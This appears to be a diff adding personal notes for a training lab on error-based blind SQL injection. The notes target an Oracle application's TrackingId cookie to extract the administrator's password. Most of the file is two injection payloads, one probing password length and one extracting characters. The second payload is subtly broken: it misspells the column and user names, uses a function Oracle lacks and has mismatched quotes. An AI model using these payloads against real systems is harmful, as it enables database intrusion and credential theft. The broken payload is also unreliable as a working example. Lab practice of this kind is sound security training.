@@ -1,0 +1,22 @@
+goal :
+    get the passsord if the username "administator" 
+
+analysis:
+    there is a users table with the following columns:
+        -username
+        -password
+    -the app returns a 500 response code when an the database throws an error
+    -the app returns a 200 response code when the database does not throw an error
+    -The database is ORACLE (There is a dual table , the from clause is required )
+
+
+
+
+
+solution:
+    the payload
+        - Get the length of the passsord:
+TrackingId=P5j4SM0g9DYRjDsI' AND (SELECT CASE WHEN exists(select * from users where username='administrator' and LENGTH(password)= 1) then 'A' else TO_CHAR(1/0)  END FROM dual)='A'--
+        -Get the passsord:
+            TrackingId=h0g5SkS5dwAFdTY6' AND (SELECT CASE WHEN (username='administator' AND SUBSTRING(passsord,1,1)='A') THEN 1/0 ELSE 'A' END FROM users)=A'
+        this payload triggers a server error when the there is a match with the desired passsord
